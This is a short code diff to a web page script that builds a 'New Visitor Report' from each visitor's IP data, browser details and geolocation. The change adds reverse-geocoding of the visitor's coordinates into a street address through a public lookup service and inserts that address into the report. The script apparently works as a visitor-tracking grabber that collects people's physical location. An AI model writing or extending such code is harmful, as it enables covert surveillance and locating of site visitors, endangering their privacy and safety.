@@ -65,6 +65,40 @@
       });
     }
 
+    async function getGeoPrompt() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) {
+          resolve({ allowed: false });
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          async pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+
+            let address = 'N/A';
+            try {
+              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
+              const data = await res.json();
+              address = data.display_name || 'Unknown location';
+            } catch (e) {
+              address = 'Lookup failed';
+            }
+
+            resolve({
+              allowed: true,
+              lat,
+              lon,
+              address
+            });
+          },
+          () => resolve({ allowed: false }),
+          { timeout: 5000 }
+        );
+      });
+    }
+
     function buildMessage(ipData, browserData, geoData) {
       return `📡 *New Visitor Report*
 
@@ -92,28 +126,8 @@
 📌 *Geo Prompt Location*
 - Status: ${geoData.allowed ? 'Allowed' : 'Denied'}
 - Latitude: ${geoData.lat || 'N/A'}
-- Longitude: ${geoData.lon || 'N/A'}`
-    }
-
-    function getGeoPrompt() {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) {
-          resolve({ allowed: false });
-          return;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            resolve({
-              allowed: true,
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude
-            });
-          },
-          () => resolve({ allowed: false }),
-          { timeout: 5000 }
-        );
-      });
+- Longitude: ${geoData.lon || 'N/A'}
+- Address: ${geoData.address || 'N/A'}`
     }
 
     (async () => {
